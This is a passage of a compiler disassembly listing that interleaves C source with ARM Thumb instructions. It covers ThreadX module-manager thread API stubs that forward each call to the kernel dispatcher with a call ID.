 80210f0:	00000004 	.word	0x00000004

080210f4 <_txe_thread_entry_exit_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_entry_exit_notify(TX_THREAD *thread_ptr, VOID (*thread_entry_exit_notify)(TX_THREAD *notify_thread_ptr, UINT type))
{
 80210f4:	b590      	push	{r4, r7, lr}
 80210f6:	b085      	sub	sp, #20
 80210f8:	af00      	add	r7, sp, #0
 80210fa:	6078      	str	r0, [r7, #4]
 80210fc:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_ENTRY_EXIT_NOTIFY_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) thread_entry_exit_notify, 0);
 80210fe:	4b07      	ldr	r3, [pc, #28]	; (802111c <_txe_thread_entry_exit_notify+0x28>)
 8021100:	f859 3003 	ldr.w	r3, [r9, r3]
 8021104:	681c      	ldr	r4, [r3, #0]
 8021106:	6879      	ldr	r1, [r7, #4]
 8021108:	683a      	ldr	r2, [r7, #0]
 802110a:	2300      	movs	r3, #0
 802110c:	2039      	movs	r0, #57	; 0x39
 802110e:	47a0      	blx	r4
 8021110:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021112:	68fb      	ldr	r3, [r7, #12]
}
 8021114:	4618      	mov	r0, r3
 8021116:	3714      	adds	r7, #20
 8021118:	46bd      	mov	sp, r7
 802111a:	bd90      	pop	{r4, r7, pc}
 802111c:	00000004 	.word	0x00000004

08021120 <_tx_thread_identify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
TX_THREAD *_tx_thread_identify(VOID)
{
 8021120:	b590      	push	{r4, r7, lr}
 8021122:	b083      	sub	sp, #12
 8021124:	af00      	add	r7, sp, #0

TX_THREAD *return_value;

    /* Call module manager dispatcher.  */
    return_value = (TX_THREAD *) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_IDENTIFY_CALL, 0, 0, 0);
 8021126:	4b08      	ldr	r3, [pc, #32]	; (8021148 <_tx_thread_identify+0x28>)
 8021128:	f859 3003 	ldr.w	r3, [r9, r3]
 802112c:	681c      	ldr	r4, [r3, #0]
 802112e:	2300      	movs	r3, #0
 8021130:	2200      	movs	r2, #0
 8021132:	2100      	movs	r1, #0
 8021134:	203a      	movs	r0, #58	; 0x3a
 8021136:	47a0      	blx	r4
 8021138:	4603      	mov	r3, r0
 802113a:	607b      	str	r3, [r7, #4]

    /* Return value to the caller.  */
    return(return_value);
 802113c:	687b      	ldr	r3, [r7, #4]
}
 802113e:	4618      	mov	r0, r3
 8021140:	370c      	adds	r7, #12
 8021142:	46bd      	mov	sp, r7
 8021144:	bd90      	pop	{r4, r7, pc}
 8021146:	bf00      	nop
 8021148:	00000004 	.word	0x00000004

0802114c <_txe_thread_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_info_get(TX_THREAD *thread_ptr, CHAR **name, UINT *state, ULONG *run_count, UINT *priority, UINT *preemption_threshold, ULONG *time_slice, TX_THREAD **next_thread, TX_THREAD **next_suspended_thread)
{
 802114c:	b590      	push	{r4, r7, lr}
 802114e:	b08d      	sub	sp, #52	; 0x34
 8021150:	af00      	add	r7, sp, #0
 8021152:	60f8      	str	r0, [r7, #12]
 8021154:	60b9      	str	r1, [r7, #8]
 8021156:	607a      	str	r2, [r7, #4]
 8021158:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[7];

    extra_parameters[0] = (ALIGN_TYPE) state;
 802115a:	687b      	ldr	r3, [r7, #4]
 802115c:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) run_count;
 802115e:	683b      	ldr	r3, [r7, #0]
 8021160:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) priority;
 8021162:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8021164:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) preemption_threshold;
 8021166:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8021168:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) time_slice;
 802116a:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 802116c:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) next_thread;
 802116e:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8021170:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) next_suspended_thread;
 8021172:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8021174:	62bb      	str	r3, [r7, #40]	; 0x28

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_INFO_GET_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8021176:	4b08      	ldr	r3, [pc, #32]	; (8021198 <_txe_thread_info_get+0x4c>)
 8021178:	f859 3003 	ldr.w	r3, [r9, r3]
 802117c:	681c      	ldr	r4, [r3, #0]
 802117e:	68f9      	ldr	r1, [r7, #12]
 8021180:	68ba      	ldr	r2, [r7, #8]
 8021182:	f107 0310 	add.w	r3, r7, #16
 8021186:	203b      	movs	r0, #59	; 0x3b
 8021188:	47a0      	blx	r4
 802118a:	62f8      	str	r0, [r7, #44]	; 0x2c

    /* Return value to the caller.  */
    return(return_value);
 802118c:	6afb      	ldr	r3, [r7, #44]	; 0x2c
}
 802118e:	4618      	mov	r0, r3
 8021190:	3734      	adds	r7, #52	; 0x34
 8021192:	46bd      	mov	sp, r7
 8021194:	bd90      	pop	{r4, r7, pc}
 8021196:	bf00      	nop
 8021198:	00000004 	.word	0x00000004

0802119c <_tx_thread_interrupt_control>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_interrupt_control(UINT new_posture)
{
 802119c:	b590      	push	{r4, r7, lr}
 802119e:	b085      	sub	sp, #20
 80211a0:	af00      	add	r7, sp, #0
 80211a2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_INTERRUPT_CONTROL_CALL, (ALIGN_TYPE) new_posture, 0, 0);
 80211a4:	4b07      	ldr	r3, [pc, #28]	; (80211c4 <_tx_thread_interrupt_control+0x28>)
 80211a6:	f859 3003 	ldr.w	r3, [r9, r3]
 80211aa:	681c      	ldr	r4, [r3, #0]
 80211ac:	2300      	movs	r3, #0
 80211ae:	2200      	movs	r2, #0
 80211b0:	6879      	ldr	r1, [r7, #4]
 80211b2:	2019      	movs	r0, #25
 80211b4:	47a0      	blx	r4
 80211b6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80211b8:	68fb      	ldr	r3, [r7, #12]
}
 80211ba:	4618      	mov	r0, r3
 80211bc:	3714      	adds	r7, #20
 80211be:	46bd      	mov	sp, r7
 80211c0:	bd90      	pop	{r4, r7, pc}
 80211c2:	bf00      	nop
 80211c4:	00000004 	.word	0x00000004

080211c8 <_tx_thread_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_performance_info_get(TX_THREAD *thread_ptr, ULONG *resumptions, ULONG *suspensions, ULONG *solicited_preemptions, ULONG *interrupt_preemptions, ULONG *priority_inversions, ULONG *time_slices, ULONG *relinquishes, ULONG *timeouts, ULONG *wait_aborts, TX_THREAD **last_preempted_by)
{
 80211c8:	b590      	push	{r4, r7, lr}
 80211ca:	b08f      	sub	sp, #60	; 0x3c
 80211cc:	af00      	add	r7, sp, #0
 80211ce:	60f8      	str	r0, [r7, #12]
 80211d0:	60b9      	str	r1, [r7, #8]
 80211d2:	607a      	str	r2, [r7, #4]
 80211d4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 80211d6:	687b      	ldr	r3, [r7, #4]
 80211d8:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) solicited_preemptions;
 80211da:	683b      	ldr	r3, [r7, #0]
 80211dc:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) interrupt_preemptions;
 80211de:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80211e0:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) priority_inversions;
 80211e2:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80211e4:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) time_slices;
 80211e6:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80211e8:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) relinquishes;
 80211ea:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80211ec:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) timeouts;
 80211ee:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80211f0:	62bb      	str	r3, [r7, #40]	; 0x28
    extra_parameters[7] = (ALIGN_TYPE) wait_aborts;
 80211f2:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80211f4:	62fb      	str	r3, [r7, #44]	; 0x2c
    extra_parameters[8] = (ALIGN_TYPE) last_preempted_by;
 80211f6:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 80211f8:	633b      	str	r3, [r7, #48]	; 0x30

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) resumptions, (ALIGN_TYPE) extra_parameters);
 80211fa:	4b08      	ldr	r3, [pc, #32]	; (802121c <_tx_thread_performance_info_get+0x54>)
 80211fc:	f859 3003 	ldr.w	r3, [r9, r3]
 8021200:	681c      	ldr	r4, [r3, #0]
 8021202:	68f9      	ldr	r1, [r7, #12]
 8021204:	68ba      	ldr	r2, [r7, #8]
 8021206:	f107 0310 	add.w	r3, r7, #16
 802120a:	203c      	movs	r0, #60	; 0x3c
 802120c:	47a0      	blx	r4
 802120e:	6378      	str	r0, [r7, #52]	; 0x34

    /* Return value to the caller.  */
    return(return_value);
 8021210:	6b7b      	ldr	r3, [r7, #52]	; 0x34
}
 8021212:	4618      	mov	r0, r3
 8021214:	373c      	adds	r7, #60	; 0x3c
 8021216:	46bd      	mov	sp, r7
 8021218:	bd90      	pop	{r4, r7, pc}
 802121a:	bf00      	nop
 802121c:	00000004 	.word	0x00000004

08021220 <_tx_thread_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_performance_system_info_get(ULONG *resumptions, ULONG *suspensions, ULONG *solicited_preemptions, ULONG *interrupt_preemptions, ULONG *priority_inversions, ULONG *time_slices, ULONG *relinquishes, ULONG *timeouts, ULONG *wait_aborts, ULONG *non_idle_returns, ULONG *idle_returns)
{
 8021220:	b590      	push	{r4, r7, lr}
 8021222:	b08f      	sub	sp, #60	; 0x3c
 8021224:	af00      	add	r7, sp, #0
 8021226:	60f8      	str	r0, [r7, #12]
 8021228:	60b9      	str	r1, [r7, #8]
 802122a:	607a      	str	r2, [r7, #4]
 802122c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) solicited_preemptions;
 802122e:	687b      	ldr	r3, [r7, #4]
 8021230:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) interrupt_preemptions;
 8021232:	683b      	ldr	r3, [r7, #0]
 8021234:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) priority_inversions;
 8021236:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021238:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) time_slices;
 802123a:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 802123c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) relinquishes;
 802123e:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8021240:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) timeouts;
 8021242:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8021244:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) wait_aborts;
 8021246:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8021248:	62bb      	str	r3, [r7, #40]	; 0x28
    extra_parameters[7] = (ALIGN_TYPE) non_idle_returns;
 802124a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 802124c:	62fb      	str	r3, [r7, #44]	; 0x2c
    extra_parameters[8] = (ALIGN_TYPE) idle_returns;
 802124e:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 8021250:	633b      	str	r3, [r7, #48]	; 0x30

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) resumptions, (ALIGN_TYPE) suspensions, (ALIGN_TYPE) extra_parameters);
 8021252:	4b08      	ldr	r3, [pc, #32]	; (8021274 <_tx_thread_performance_system_info_get+0x54>)
 8021254:	f859 3003 	ldr.w	r3, [r9, r3]
 8021258:	681c      	ldr	r4, [r3, #0]
 802125a:	68f9      	ldr	r1, [r7, #12]
 802125c:	68ba      	ldr	r2, [r7, #8]
 802125e:	f107 0310 	add.w	r3, r7, #16
 8021262:	203d      	movs	r0, #61	; 0x3d
 8021264:	47a0      	blx	r4
 8021266:	6378      	str	r0, [r7, #52]	; 0x34

    /* Return value to the caller.  */
    return(return_value);
 8021268:	6b7b      	ldr	r3, [r7, #52]	; 0x34
}
 802126a:	4618      	mov	r0, r3
 802126c:	373c      	adds	r7, #60	; 0x3c
 802126e:	46bd      	mov	sp, r7
 8021270:	bd90      	pop	{r4, r7, pc}
 8021272:	bf00      	nop
 8021274:	00000004 	.word	0x00000004

08021278 <_txe_thread_preemption_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_preemption_change(TX_THREAD *thread_ptr, UINT new_threshold, UINT *old_threshold)
{
 8021278:	b590      	push	{r4, r7, lr}
 802127a:	b087      	sub	sp, #28
 802127c:	af00      	add	r7, sp, #0
 802127e:	60f8      	str	r0, [r7, #12]
 8021280:	60b9      	str	r1, [r7, #8]
 8021282:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PREEMPTION_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_threshold, (ALIGN_TYPE) old_threshold);
 8021284:	4b07      	ldr	r3, [pc, #28]	; (80212a4 <_txe_thread_preemption_change+0x2c>)
 8021286:	f859 3003 	ldr.w	r3, [r9, r3]
 802128a:	681c      	ldr	r4, [r3, #0]
 802128c:	68f9      	ldr	r1, [r7, #12]
 802128e:	687b      	ldr	r3, [r7, #4]
 8021290:	68ba      	ldr	r2, [r7, #8]
 8021292:	203e      	movs	r0, #62	; 0x3e
 8021294:	47a0      	blx	r4
 8021296:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021298:	697b      	ldr	r3, [r7, #20]
}
 802129a:	4618      	mov	r0, r3
 802129c:	371c      	adds	r7, #28
 802129e:	46bd      	mov	sp, r7
 80212a0:	bd90      	pop	{r4, r7, pc}
 80212a2:	bf00      	nop
 80212a4:	00000004 	.word	0x00000004

080212a8 <_txe_thread_priority_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_priority_change(TX_THREAD *thread_ptr, UINT new_priority, UINT *old_priority)
{
 80212a8:	b590      	push	{r4, r7, lr}
 80212aa:	b087      	sub	sp, #28
 80212ac:	af00      	add	r7, sp, #0
 80212ae:	60f8      	str	r0, [r7, #12]
 80212b0:	60b9      	str	r1, [r7, #8]
 80212b2:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PRIORITY_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_priority, (ALIGN_TYPE) old_priority);
 80212b4:	4b07      	ldr	r3, [pc, #28]	; (80212d4 <_txe_thread_priority_change+0x2c>)
 80212b6:	f859 3003 	ldr.w	r3, [r9, r3]
 80212ba:	681c      	ldr	r4, [r3, #0]
 80212bc:	68f9      	ldr	r1, [r7, #12]
 80212be:	687b      	ldr	r3, [r7, #4]
 80212c0:	68ba      	ldr	r2, [r7, #8]
 80212c2:	203f      	movs	r0, #63	; 0x3f
 80212c4:	47a0      	blx	r4
 80212c6:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80212c8:	697b      	ldr	r3, [r7, #20]
}
 80212ca:	4618      	mov	r0, r3
 80212cc:	371c      	adds	r7, #28
 80212ce:	46bd      	mov	sp, r7
 80212d0:	bd90      	pop	{r4, r7, pc}
 80212d2:	bf00      	nop
 80212d4:	00000004 	.word	0x00000004

080212d8 <_txe_thread_relinquish>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _txe_thread_relinquish(VOID)
{
 80212d8:	b598      	push	{r3, r4, r7, lr}
 80212da:	af00      	add	r7, sp, #0


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RELINQUISH_CALL, 0, 0, 0);
 80212dc:	4b05      	ldr	r3, [pc, #20]	; (80212f4 <_txe_thread_relinquish+0x1c>)
 80212de:	f859 3003 	ldr.w	r3, [r9, r3]
 80212e2:	681c      	ldr	r4, [r3, #0]
 80212e4:	2300      	movs	r3, #0
 80212e6:	2200      	movs	r2, #0
 80212e8:	2100      	movs	r1, #0
 80212ea:	2040      	movs	r0, #64	; 0x40
 80212ec:	47a0      	blx	r4
}
 80212ee:	bf00      	nop
 80212f0:	bd98      	pop	{r3, r4, r7, pc}
 80212f2:	bf00      	nop
 80212f4:	00000004 	.word	0x00000004

080212f8 <_txe_thread_reset>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_reset(TX_THREAD *thread_ptr)
{
 80212f8:	b590      	push	{r4, r7, lr}
 80212fa:	b085      	sub	sp, #20
 80212fc:	af00      	add	r7, sp, #0
 80212fe:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RESET_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021300:	4b07      	ldr	r3, [pc, #28]	; (8021320 <_txe_thread_reset+0x28>)
 8021302:	f859 3003 	ldr.w	r3, [r9, r3]
 8021306:	681c      	ldr	r4, [r3, #0]
 8021308:	6879      	ldr	r1, [r7, #4]
 802130a:	2300      	movs	r3, #0
 802130c:	2200      	movs	r2, #0
 802130e:	2041      	movs	r0, #65	; 0x41
 8021310:	47a0      	blx	r4
 8021312:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021314:	68fb      	ldr	r3, [r7, #12]
}
 8021316:	4618      	mov	r0, r3
 8021318:	3714      	adds	r7, #20
 802131a:	46bd      	mov	sp, r7
 802131c:	bd90      	pop	{r4, r7, pc}
 802131e:	bf00      	nop
 8021320:	00000004 	.word	0x00000004

08021324 <_txe_thread_resume>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_resume(TX_THREAD *thread_ptr)
{
 8021324:	b590      	push	{r4, r7, lr}
 8021326:	b085      	sub	sp, #20
 8021328:	af00      	add	r7, sp, #0
 802132a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RESUME_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 802132c:	4b07      	ldr	r3, [pc, #28]	; (802134c <_txe_thread_resume+0x28>)
 802132e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021332:	681c      	ldr	r4, [r3, #0]
 8021334:	6879      	ldr	r1, [r7, #4]
 8021336:	2300      	movs	r3, #0
 8021338:	2200      	movs	r2, #0
 802133a:	2042      	movs	r0, #66	; 0x42
 802133c:	47a0      	blx	r4
 802133e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021340:	68fb      	ldr	r3, [r7, #12]
}
 8021342:	4618      	mov	r0, r3
 8021344:	3714      	adds	r7, #20
 8021346:	46bd      	mov	sp, r7
 8021348:	bd90      	pop	{r4, r7, pc}
 802134a:	bf00      	nop
 802134c:	00000004 	.word	0x00000004

08021350 <_tx_thread_sleep>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_sleep(ULONG timer_ticks)
{
 8021350:	b590      	push	{r4, r7, lr}
 8021352:	b085      	sub	sp, #20
 8021354:	af00      	add	r7, sp, #0
 8021356:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SLEEP_CALL, (ALIGN_TYPE) timer_ticks, 0, 0);
 8021358:	4b07      	ldr	r3, [pc, #28]	; (8021378 <_tx_thread_sleep+0x28>)
 802135a:	f859 3003 	ldr.w	r3, [r9, r3]
 802135e:	681c      	ldr	r4, [r3, #0]
 8021360:	2300      	movs	r3, #0
 8021362:	2200      	movs	r2, #0
 8021364:	6879      	ldr	r1, [r7, #4]
 8021366:	2043      	movs	r0, #67	; 0x43
 8021368:	47a0      	blx	r4
 802136a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802136c:	68fb      	ldr	r3, [r7, #12]
}
 802136e:	4618      	mov	r0, r3
 8021370:	3714      	adds	r7, #20
 8021372:	46bd      	mov	sp, r7
 8021374:	bd90      	pop	{r4, r7, pc}
 8021376:	bf00      	nop
 8021378:	00000004 	.word	0x00000004

0802137c <_tx_thread_stack_error_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_stack_error_notify(VOID (*stack_error_handler)(TX_THREAD *thread_ptr))
{
 802137c:	b590      	push	{r4, r7, lr}
 802137e:	b085      	sub	sp, #20
 8021380:	af00      	add	r7, sp, #0
 8021382:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_STACK_ERROR_NOTIFY_CALL, (ALIGN_TYPE) stack_error_handler, 0, 0);
 8021384:	4b07      	ldr	r3, [pc, #28]	; (80213a4 <_tx_thread_stack_error_notify+0x28>)
 8021386:	f859 3003 	ldr.w	r3, [r9, r3]
 802138a:	681c      	ldr	r4, [r3, #0]
 802138c:	6879      	ldr	r1, [r7, #4]
 802138e:	2300      	movs	r3, #0
 8021390:	2200      	movs	r2, #0
 8021392:	2044      	movs	r0, #68	; 0x44
 8021394:	47a0      	blx	r4
 8021396:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021398:	68fb      	ldr	r3, [r7, #12]
}
 802139a:	4618      	mov	r0, r3
 802139c:	3714      	adds	r7, #20
 802139e:	46bd      	mov	sp, r7
 80213a0:	bd90      	pop	{r4, r7, pc}
 80213a2:	bf00      	nop
 80213a4:	00000004 	.word	0x00000004

080213a8 <_txe_thread_suspend>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_suspend(TX_THREAD *thread_ptr)
{
 80213a8:	b590      	push	{r4, r7, lr}
 80213aa:	b085      	sub	sp, #20
 80213ac:	af00      	add	r7, sp, #0
 80213ae:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SUSPEND_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 80213b0:	4b07      	ldr	r3, [pc, #28]	; (80213d0 <_txe_thread_suspend+0x28>)
 80213b2:	f859 3003 	ldr.w	r3, [r9, r3]
 80213b6:	681c      	ldr	r4, [r3, #0]
 80213b8:	6879      	ldr	r1, [r7, #4]
 80213ba:	2300      	movs	r3, #0
 80213bc:	2200      	movs	r2, #0
 80213be:	2045      	movs	r0, #69	; 0x45
 80213c0:	47a0      	blx	r4
 80213c2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80213c4:	68fb      	ldr	r3, [r7, #12]
}
 80213c6:	4618      	mov	r0, r3
 80213c8:	3714      	adds	r7, #20
 80213ca:	46bd      	mov	sp, r7
 80213cc:	bd90      	pop	{r4, r7, pc}
 80213ce:	bf00      	nop
 80213d0:	00000004 	.word	0x00000004

080213d4 <_txe_thread_terminate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_terminate(TX_THREAD *thread_ptr)
{
 80213d4:	b590      	push	{r4, r7, lr}
 80213d6:	b085      	sub	sp, #20
 80213d8:	af00      	add	r7, sp, #0
 80213da:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_TERMINATE_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 80213dc:	4b07      	ldr	r3, [pc, #28]	; (80213fc <_txe_thread_terminate+0x28>)
 80213de:	f859 3003 	ldr.w	r3, [r9, r3]
 80213e2:	681c      	ldr	r4, [r3, #0]
 80213e4:	6879      	ldr	r1, [r7, #4]
 80213e6:	2300      	movs	r3, #0
 80213e8:	2200      	movs	r2, #0
 80213ea:	2046      	movs	r0, #70	; 0x46
 80213ec:	47a0      	blx	r4
 80213ee:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80213f0:	68fb      	ldr	r3, [r7, #12]
}
 80213f2:	4618      	mov	r0, r3
 80213f4:	3714      	adds	r7, #20
 80213f6:	46bd      	mov	sp, r7
 80213f8:	bd90      	pop	{r4, r7, pc}
 80213fa:	bf00      	nop
 80213fc:	00000004 	.word	0x00000004

08021400 <_txe_thread_time_slice_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_time_slice_change(TX_THREAD *thread_ptr, ULONG new_time_slice, ULONG *old_time_slice)
{
 8021400:	b590      	push	{r4, r7, lr}
 8021402:	b087      	sub	sp, #28
 8021404:	af00      	add	r7, sp, #0
 8021406:	60f8      	str	r0, [r7, #12]
 8021408:	60b9      	str	r1, [r7, #8]
 802140a:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_TIME_SLICE_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_time_slice, (ALIGN_TYPE) old_time_slice);
 802140c:	4b07      	ldr	r3, [pc, #28]	; (802142c <_txe_thread_time_slice_change+0x2c>)
 802140e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021412:	681c      	ldr	r4, [r3, #0]
 8021414:	68f9      	ldr	r1, [r7, #12]
 8021416:	687b      	ldr	r3, [r7, #4]
 8021418:	68ba      	ldr	r2, [r7, #8]
 802141a:	2047      	movs	r0, #71	; 0x47
 802141c:	47a0      	blx	r4
 802141e:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021420:	697b      	ldr	r3, [r7, #20]
}
 8021422:	4618      	mov	r0, r3
 8021424:	371c      	adds	r7, #28
 8021426:	46bd      	mov	sp, r7
 8021428:	bd90      	pop	{r4, r7, pc}
 802142a:	bf00      	nop
 802142c:	00000004 	.word	0x00000004

08021430 <_txe_thread_wait_abort>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_wait_abort(TX_THREAD *thread_ptr)
{
 8021430:	b590      	push	{r4, r7, lr}
 8021432:	b085      	sub	sp, #20
 8021434:	af00      	add	r7, sp, #0
 8021436:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_WAIT_ABORT_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021438:	4b07      	ldr	r3, [pc, #28]	; (8021458 <_txe_thread_wait_abort+0x28>)
 802143a:	f859 3003 	ldr.w	r3, [r9, r3]
